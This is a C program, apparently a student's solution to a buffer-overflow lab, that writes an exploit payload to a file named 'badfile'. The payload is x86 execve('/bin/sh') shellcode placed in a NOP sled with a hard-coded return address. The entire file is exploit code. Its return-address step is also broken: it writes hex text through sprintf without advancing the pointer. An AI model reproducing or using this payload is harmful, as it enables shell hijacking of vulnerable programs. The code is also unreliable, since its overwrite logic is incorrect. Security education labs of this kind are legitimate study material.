/* A program that creates a file containing code for launching shell*/#include <stdlib.h>#include <stdio.h>#include <string.h>char shellcode[]=	"\x31\xc0"	"\x50"	"\x68""//sh"	"\x68""/bin"	"\x89\xe3"	"\x50"	"\x53"	"\x89\xe1"	"\x99"	"\xb0\x0b"	"\xcd\x80";unsigned long get_sp(void) {	__asm__("movl %esp,%eax");}void main(int argc, char **argv){    int bsize = 517;    char buffer[bsize];    FILE *badfile;        int offset = 0;    if (argc > 1) offset = atoi(argv[1]);    /* Initialize buffer with 0x90 (NOP instruction) */    memset(&buffer, 0x90, bsize);    /* You need to fill the buffer with appropriate contents here */	buffer[bsize - 1] = '\0';		/* Put return address in correct place (+/- one block for good measure) */		// [buffer -> 20 bytes][FP -> 4][ret -> 4] 		// ret should be at buffer + 28 	int j =  24;	j += 4 - (j % 4);	char *ptr = buffer + j;	int i = 0;	// 0xbffff0f8 should be address of buffer	// 0xbffff15c should be 100 past buffer (somewhere in NOP sled) */		// convert to Little Endian		char *addr = "\x24\xf1\xff\xbf";	for (; i < 3; i++)	{		sprintf(ptr,"%x",*addr);		//printf("%x",*addr);		//ptr += 4;	}	/*for (i = 0; i < 4; i++)		printf("%s",(buffer+28+i));	printf("\n");*/		/* Shellcode goes in somewhere after return address */	j = 28;	ptr = buffer + j;	memcpy(ptr, shellcode, strlen(shellcode));	for (i = j; i < bsize; i++)		printf("%c",buffer[i]);	printf("\n");    /* Save the contents to the file "badfile" */    badfile = fopen("./badfile", "w");    fwrite(buffer, bsize, 1, badfile);    fclose(badfile);}